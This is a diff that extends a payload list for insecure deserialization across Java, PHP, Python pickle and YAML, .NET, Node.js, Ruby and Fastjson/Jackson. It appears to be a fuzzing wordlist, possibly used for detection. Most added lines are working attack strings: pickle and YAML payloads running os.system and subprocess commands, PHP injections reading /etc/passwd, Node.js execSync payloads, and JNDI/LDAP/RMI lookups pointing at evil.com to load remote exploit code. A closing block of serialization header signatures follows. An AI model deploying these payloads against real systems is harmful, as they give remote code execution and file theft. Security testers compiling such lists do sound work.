@@ -53,3 +53,163 @@ Spring2
 
 # Ruby Marshal
 \x04\x08o:\x10User\x06:\x0arole:\x0aadmin
+
+# Advanced Java gadget chains
+# Apache Commons Collections
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors.InvokerTransformer
+org.apache.commons.collections.functors.ChainedTransformer
+org.apache.commons.collections.functors.ConstantTransformer
+org.apache.commons.collections.keyvalue.TiedMapEntry
+org.apache.commons.collections.map.LazyMap
+
+# Spring Framework
+org.springframework.context.support.ClassPathXmlApplicationContext
+org.springframework.beans.factory.config.PropertyPathFactoryBean
+
+# C3P0
+com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase
+com.mchange.v2.c3p0.JndiRefForwardingDataSource
+
+# Hibernate
+org.hibernate.engine.spi.TypedValue
+org.hibernate.tuple.component.AbstractComponentTuplizer
+
+# Vaadin
+com.vaadin.data.util.NestedMethodProperty
+com.vaadin.data.util.PropertysetItem
+
+# Advanced PHP serialization
+O:8:"stdClass":1:{s:4:"code";s:10:"phpinfo();";}
+O:11:"PDOStatement":0:{}
+a:2:{i:0;O:8:"stdClass":0:{}i:1;s:5:"admin";}
+O:12:"SplFileObject":1:{s:0:"";s:11:"/etc/passwd";}
+
+# PHP object injection with magic methods
+O:10:"Evil_Class":1:{s:8:"filename";s:11:"/etc/passwd";}
+O:4:"User":2:{s:2:"id";i:1;s:4:"role";s:5:"admin";}
+O:7:"PhpCode":1:{s:4:"code";s:6:"system";}
+
+# Advanced Python pickle
+\x80\x03csubprocess\ncheck_output\n(S'ls'\ntR.
+\x80\x03csubprocess\nPopen\n(S'calc'\ntR.
+\x80\x03cos\nsystem\n(S'whoami'\ntR.
+cos\nsystem\n(S'cat /etc/passwd'\ntR.
+
+# Python pickle RCE variants
+c__builtin__\neval\n(S'__import__("os").system("ls")'\ntR.
+\x80\x03c__builtin__\nexec\n(S'import os;os.system("whoami")'\ntR.
+
+# .NET BinaryFormatter
+AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0u
+AAEAAAD/////AQAAAAAAAAAEAQAAAClT
+
+# .NET ObjectStateFormatter
+/wEy
+
+# .NET SoapFormatter
+<SOAP-ENV:Envelope
+
+# ViewState exploitation (.NET)
+__VIEWSTATE=/wEPDwUKLTY5NDY
+__VIEWSTATEGENERATOR=CA0B0334
+
+# JSON deserialization with type confusion
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}
+{"__type":"System.IO.FileInfo"}
+{"@class":"java.net.URL","val":"http://evil.com"}
+
+# Jackson polymorphic deserialization
+["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:"}]
+["org.apache.xbean.propertyeditor.JndiConverter",{"asText":"ldap://evil.com/"}]
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://evil.com/","autoCommit":true}]
+
+# Fastjson exploitation
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
+{"@type":"java.net.Inet4Address","val":"evil.com"}
+{"@type":"java.net.URL","val":"http://evil.com"}
+
+# YAML deserialization (Python)
+!!python/object/apply:subprocess.Popen [['calc']]
+!!python/object/new:os.system [calc]
+!!python/object/apply:os.system ['whoami']
+
+# YAML deserialization (Ruby)
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::Requirement
+requirements: !ruby/object:Gem::Package::TarReader
+
+# Node.js prototype pollution
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"__proto__":{"shell":"/bin/sh"}}
+
+# Node.js VM escape
+{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString()}()"}
+{"eval":"_$$ND_FUNC$$_function(){return global.process.mainModule.require('child_process').execSync('id').toString()}()"}
+
+# Ruby YAML deserialization
+--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y
+!ruby/object:Gem::Requirement {requirements: [[!, !ruby/object:Gem::Package::TarReader {}}]}
+
+# Java RMI exploitation
+rmi://evil.com:1099/Object
+rmi://127.0.0.1:1099/Exploit
+
+# JNDI injection patterns
+ldap://evil.com/Exploit
+ldaps://evil.com/Exploit
+rmi://evil.com/Exploit
+dns://evil.com/Exploit
+iiop://evil.com/Exploit
+corba://evil.com/Exploit
+
+# Java gadget chain references
+ysoserial.payloads.CommonsCollections1
+ysoserial.payloads.CommonsCollections2
+ysoserial.payloads.CommonsCollections3
+ysoserial.payloads.CommonsCollections4
+ysoserial.payloads.CommonsCollections5
+ysoserial.payloads.CommonsCollections6
+ysoserial.payloads.CommonsCollections7
+ysoserial.payloads.Groovy1
+ysoserial.payloads.Spring1
+ysoserial.payloads.Spring2
+ysoserial.payloads.ROME
+ysoserial.payloads.JDK7u21
+ysoserial.payloads.Jython1
+ysoserial.payloads.Click1
+ysoserial.payloads.Wicket1
+
+# Base64 encoded Java serialized objects
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU=
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldABA
+
+# PHP Phar deserialization
+phar://exploit.phar/test.txt
+phar://./exploit.phar
+phar://exploit.jpg/test.txt
+
+# AMF (Action Message Format)
+\x00\x03\x00\x00\x00\x01
+
+# MessagePack
+\x81\xa4eval\xa6system
+
+# Pickle bytecode patterns
+c__builtin__\ngetattr\n
+c__builtin__\n__import__\n
+cos\nsystem\n
+csubprocess\ncall\n
+csubprocess\ncheck_output\n
+
+# Serialization headers detection
+\xac\xed\x00\x05  # Java serialization
+O:  # PHP serialization
+\x80\x03  # Python pickle protocol 3
+\x80\x04  # Python pickle protocol 4
+\x04\x08  # Ruby Marshal
+AAEAAAD  # .NET BinaryFormatter
+/wE  # .NET ObjectStateFormatter
